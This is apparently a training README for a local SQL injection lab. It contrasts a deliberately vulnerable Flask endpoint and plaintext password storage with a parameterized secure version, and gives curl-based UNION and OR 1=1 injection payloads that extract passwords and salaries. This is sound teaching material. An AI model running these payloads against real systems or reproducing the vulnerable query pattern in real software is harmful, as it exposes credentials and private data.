# A03: Injection (SQL Injection) - Simple Example

## Overview
This example demonstrates SQL injection vulnerability through a single vulnerable endpoint that allows attackers to extract sensitive data from the database.

## Database Schema
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    email TEXT NOT NULL,
    password TEXT NOT NULL,     -- Stored in plain text (vulnerable)
    role TEXT DEFAULT 'user',   -- 'admin' or 'user'
    salary INTEGER DEFAULT 0    -- Sensitive financial data
);
```

**Sample Data:**
- ID 1: admin / admin@company.com / admin123 / admin / $150,000
- ID 2: alice / alice@company.com / password123 / user / $75,000  
- ID 3: bob / bob@company.com / secret456 / user / $65,000

## Vulnerable Endpoint: `/api/user/<id>`

### **Vulnerable Code:**
```python
@app.route('/api/user/<user_id>')
def get_user(user_id):
    # VULNERABLE: Direct string concatenation
    query = f"SELECT id, username, email, role FROM users WHERE id = {user_id}"
    cursor.execute(query)
```

### **Why It's Vulnerable:**
- **No input validation** - accepts any string as user_id
- **String concatenation** - directly inserts user input into SQL query
- **No parameterization** - treats user input as SQL code

## SQL Injection Attacks

### **1. Extract All Passwords**
```bash
curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%201,username,password,role%20FROM%20users--'
```

**What happens:**
- URL decodes to: `1 UNION SELECT 1,username,password,role FROM users--`
- Resulting SQL: `SELECT id, username, email, role FROM users WHERE id = 1 UNION SELECT 1,username,password,role FROM users--`
- Returns: All usernames and passwords in the response

### **2. Extract Salary Information**
```bash
curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%201,username,salary,role%20FROM%20users--'
```

**Impact:** Reveals all employee salaries

### **3. Boolean-based Attack**
```bash
curl 'http://localhost:5002/api/user/1%20OR%201=1--'
```

**What happens:**
- Resulting SQL: `SELECT id, username, email, role FROM users WHERE id = 1 OR 1=1--`
- `1=1` is always true, so returns first user in database
- Bypasses the ID-based lookup entirely

### **4. Targeted Data Extraction**
```bash
curl 'http://localhost:5002/api/user/999%20UNION%20SELECT%201,username,password,email%20FROM%20users%20WHERE%20username=%27admin%27--'
```

**Impact:** Specifically targets admin credentials

## Attack Demonstration

### **Step 1: Normal Request**
```bash
curl http://localhost:5002/api/user/1
```
**Response:**
```json
{
  "id": 1,
  "username": "admin",
  "email": "admin@company.com",
  "role": "admin"
}
```

### **Step 2: Injection Attack**
```bash
curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%201,username,password,role%20FROM%20users--'
```
**Response:**
```json
{
  "id": 1,
  "username": "admin",
  "email": "admin123",    // This is actually the password!
  "role": "admin"
}
```

**Result:** The password appears in the "email" field due to column mapping in the UNION query.

## Secure Implementation: `/api/secure/user/<id>`

### **Secure Code:**
```python
@app.route('/api/secure/user/<user_id>')
def get_user_secure(user_id):
    try:
        # Input validation
        user_id = int(user_id)
    except ValueError:
        return jsonify({'error': 'Invalid user ID format'}), 400
    
    # SECURE: Parameterized query
    query = "SELECT id, username, email, role FROM users WHERE id = ?"
    cursor.execute(query, (user_id,))
```

### **Security Improvements:**
1. **Input validation** - ensures user_id is an integer
2. **Parameterized query** - uses `?` placeholder
3. **Parameter binding** - passes user_id as separate parameter
4. **Error handling** - doesn't expose SQL errors

### **Why It's Secure:**
- User input is treated as **data**, not **code**
- SQL structure cannot be modified by user input
- Database driver handles proper escaping automatically

## Testing the Vulnerability

### **Run the Server:**
```bash
python A03_Example_Injection.py
```

### **Test Vulnerable Endpoint:**
```bash
# Extract passwords
curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%201,username,password,role%20FROM%20users--'

# Extract salaries  
curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%201,username,salary,role%20FROM%20users--'

# Boolean injection
curl 'http://localhost:5002/api/user/1%20OR%201=1--'
```

### **Test Secure Endpoint:**
```bash
# These attacks will fail safely
curl 'http://localhost:5002/api/secure/user/1%20UNION%20SELECT%201,2,3,4--'
curl 'http://localhost:5002/api/secure/user/1%20OR%201=1--'

# Normal usage works fine
curl http://localhost:5002/api/secure/user/1
```

## Impact Assessment

| Data Exposed | Vulnerability Level | Business Impact |
|--------------|-------------------|-----------------|
| **User Passwords** | 🔴 Critical | Account takeover, credential reuse attacks |
| **Employee Salaries** | 🟠 High | Privacy violation, competitive intelligence |
| **Email Addresses** | 🟡 Medium | Phishing attacks, data correlation |
| **User Roles** | 🟡 Medium | Privilege escalation planning |

## Key Learning Points

1. **Never concatenate user input** directly into SQL queries
2. **Always use parameterized queries** with placeholder values
3. **Validate all input** before processing
4. **Handle errors gracefully** without exposing internal details
5. **Test for injection vulnerabilities** regularly

## Files
- `A03_Example_Injection.py` - Simple Flask app with one vulnerable endpoint
- `A03_curl_commands.txt` - Attack examples and test commands
- `A03_README.md` - This documentation

---
**⚠️ WARNING: Contains intentional vulnerabilities for educational purposes only!**